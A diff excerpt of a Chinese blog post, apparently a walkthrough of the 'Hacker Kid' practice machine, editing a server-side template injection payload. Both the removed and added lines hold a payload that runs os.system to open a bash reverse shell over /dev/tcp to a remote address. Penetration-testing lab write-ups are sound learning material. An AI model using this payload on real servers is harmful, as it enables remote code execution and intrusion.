@@ -232,7 +232,7 @@
 <p>先行尝试一个运算表达：</p>
 <p><img src="/2023/11/16/Hacker-Kid/image-20231116191132020.png" alt="image-20231116191132020"></p>
 <p>那就利用服务器端模板注入漏洞（SSTI）进行shell的反弹：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt; /dev/tcp/192.168.43.129/4321 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.43.129/4321 0&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>但是在bp当中需要进行特殊字符编码：</p>
 <p><img src="/2023/11/16/Hacker-Kid/image-20231116191450307.png" alt="image-20231116191450307"></p>
